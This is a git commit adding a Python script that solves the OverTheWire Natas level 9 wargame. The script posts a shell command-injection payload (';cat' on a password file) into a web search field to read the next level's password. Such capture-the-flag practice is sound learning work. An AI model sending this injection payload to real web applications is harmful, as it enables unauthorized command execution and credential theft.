a89a29f89f3c22229848ed740eb277d10c08a717
niroj <nirojnaik12@gmail.com>
2026-01-29 16:23:18 +0530

    natas 10 password has been acquird

---
+++ scripts/natas9-10.py
@@ -0,0 +1,35 @@
+import requests
+import re
+
+userName = 'natas9'
+url = f'http://{userName}.natas.labs.overthewire.org/'
+fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt')
+password = fileContent.readlines()[8][7:39]
+
+response = requests.get(url, auth = (userName, password))
+htmlDoc = response.text
+# print(htmlDoc)
+
+response = requests.get(url + "index-source.html", auth = (userName, password))
+htmlDoc = response.text
+# print(htmlDoc)
+
+data = {
+    'needle': ';cat ../../../../etc/natas_webpass/natas10',
+    'submit': 'Search'
+}
+
+response = requests.post(url, auth = (userName, password), data = data)
+htmlDoc = response.text
+# print(htmlDoc)
+
+print(re.findall("/natas(.*)", htmlDoc))
+
+try:
+    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
+        htmlContent.writelines(htmlDoc)
+        print("Operation accomplished!")
+except IOError as e:
+    print(f"Error appear{e}")
+
+# run the command and the password will be appeared in index.html
